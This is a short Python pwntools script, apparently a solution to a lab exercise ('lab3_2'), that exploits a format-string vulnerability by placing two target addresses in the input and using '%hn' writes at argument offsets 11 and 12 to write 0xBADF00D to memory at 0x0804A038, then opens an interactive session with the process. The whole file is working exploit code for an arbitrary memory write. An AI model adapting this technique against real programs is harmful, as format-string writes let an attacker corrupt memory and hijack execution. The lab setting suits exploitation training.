from pwn import *

offset = 11

target_addr = 0x0804A038
target_addr1 = target_addr + 2
target_addr2 = target_addr

target_value = 0xBADF00D
target_value1 = 0x0BAD
target_value2 = 0xF00D

#payload = p32(target_addr) + b'%' + str(target_value - 4).encode() + b'c%11$n'
payload = p32(target_addr1) + p32(target_addr2)
payload += b'%' + str(target_value1 - 8).encode() + b'c%11$hn'
payload += b'%' + str(target_value2 - target_value1).encode() + b'c%12$hn'

p = process(['./lab3_2', payload])

p.interactive()